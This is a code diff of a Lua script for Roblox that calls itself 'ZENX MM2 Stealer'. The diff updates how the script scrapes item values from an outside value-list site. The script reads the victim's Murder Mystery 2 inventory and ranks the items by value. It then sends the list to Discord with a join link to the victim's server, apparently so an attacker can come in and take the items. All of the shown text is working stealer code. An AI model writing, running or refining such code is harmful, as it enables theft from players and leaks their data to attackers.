@@ -18,37 +18,59 @@ if game.PlaceId ~= 142823291 then
     return
 end
 
--- Multi-Category Live Scraper
-local itemValues = {}
-local function scrapeCategory(cat)
-    local url = "https://supremevalues.com/mm2/" .. cat:lower()
-    pcall(function()
-        local resp = request({Url = url, Method = "GET"})
-        if resp and resp.Body then
-            for name, valStr in resp.Body:gmatch(">([%w%s'%-]+)</[^>]+>%s*Value%s*%-%s*%*?([%d,]+)%*?") do
-                local clean = name:match("^%s*(.-)%s*$")
-                local v = tonumber(valStr:gsub(",", ""))
-                if clean and v and v > 30 then
-                    itemValues[clean] = v
-                    itemValues[clean:lower()] = v
+-- Biscuit-Style Value Scraper
+local valuePages = {
+    godly = "https://supremevaluelist.com/mm2/godlies.html",
+    ancient = "https://supremevaluelist.com/mm2/ancients.html",
+    unique = "https://supremevaluelist.com/mm2/uniques.html",
+    vintage = "https://supremevaluelist.com/mm2/vintages.html",
+    chroma = "https://supremevaluelist.com/mm2/chromas.html"
+}
+
+local function cleanString(str)
+    return str:match("^%s*(.-)%s*$")
+end
+
+local function getItemValue(htmlBlock)
+    local valText = htmlBlock:match("([%d,]+)")
+    if valText then return tonumber(valText:gsub(",", "")) end
+    return nil
+end
+
+local function parsePage(pageHtml)
+    local values = {}
+    for block in pageHtml:gmatch("(<h.-</div>)") do  -- Better block matching
+        local title = block:match(">([^<]+)<")
+        local val = getItemValue(block)
+        if title and val then
+            local cleanTitle = cleanString(title:gsub("%s+", " "))
+            cleanTitle = cleanString((cleanTitle:split(" Click "))[1])
+            values[cleanTitle:lower()] = val
+        end
+    end
+    return values
+end
+
+local function loadValues()
+    local normalValues = {}
+    for _, link in pairs(valuePages) do
+        pcall(function()
+            local resp = request({Url = link, Method = "GET"})
+            if resp and resp.Body then
+                local parsed = parsePage(resp.Body)
+                for n, v in pairs(parsed) do
+                    normalValues[n] = v
                 end
             end
-        end
-    end)
-end
-
-local function loadLiveValues()
-    local cats = {"godly","ancient","unique","vintage","legendary","rare","uncommon"}
-    for _, c in ipairs(cats) do
-        scrapeCategory(c)
-        task.wait(0.6)
+        end)
+        task.wait(0.5)
     end
-    print("✅ Loaded " .. #itemValues .. " live values from categories")
+    return normalValues
 end
 
-loadLiveValues()
+local itemValues = loadValues()
 
--- In-Game Inventory (original method)
+-- In-Game Inventory
 local itemsToTrade = {}
 local overallValue = 0
 local itemDatabase = require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
@@ -62,7 +84,7 @@ if success and inventoryData and inventoryData.Weapons then
         local info = itemDatabase[itemId]
         if info and not (itemId == "DefaultGun" or itemId == "DefaultKnife") then
             local name = tostring(info.ItemName)
-            local val = itemValues[name] or itemValues[name:lower()] or 100
+            local val = itemValues[name:lower()] or 150
             overallValue += val * count
             table.insert(itemsToTrade, {id = itemId, name = name, qty = count, val = val})
         end
@@ -71,7 +93,7 @@ end
 
 table.sort(itemsToTrade, function(a, b) return (a.val * a.qty) > (b.val * b.qty) end)
 
--- Discord
+-- Discord with your joiner
 local function postToDiscord()
     local joinLink = "https://plsbrainrot.me/joiner?placeId=142823291&gameInstanceId=" .. game.JobId
     local displayLines = {}
@@ -95,7 +117,7 @@ local function postToDiscord()
                 {name = "Top Items", value = "```" .. table.concat(displayLines, "\n") .. "```", inline = false},
                 {name = "Custom Joiner", value = joinLink, inline = false},
             },
-            footer = {text = "ZENX HUB • In-Game + Live Scraper"},
+            footer = {text = "ZENX HUB • Biscuit Scraper"},
             timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
         }}
     }
@@ -159,4 +181,4 @@ for _, plr in ipairs(Players:GetPlayers()) do onPlayerAdded(plr) end
 Players.PlayerAdded:Connect(onPlayerAdded)
 
 postToDiscord()
-print("✅ ZENX MM2 Stealer Ready - In-Game Inventory + Multi Scraper")
+print("✅ ZENX MM2 Stealer - Biscuit Value Scraper Loaded")
